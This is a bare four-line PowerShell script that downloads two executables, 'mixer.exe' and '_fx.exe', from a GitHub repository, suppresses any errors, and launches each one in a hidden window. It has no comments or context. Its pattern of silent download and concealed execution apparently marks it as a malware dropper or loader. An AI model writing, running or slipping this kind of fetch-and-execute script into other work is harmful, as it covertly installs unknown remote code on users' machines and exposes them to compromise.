Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/mixer.exe" -OutFile "mixer.exe" -ErrorAction SilentlyContinue
    Start-Process -FilePath "mixer.exe" -WindowStyle Hidden
Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/_fx.exe" -OutFile "_fx.exe" -ErrorAction SilentlyContinue
    Start-Process -FilePath "_fx.exe" -WindowStyle Hidden
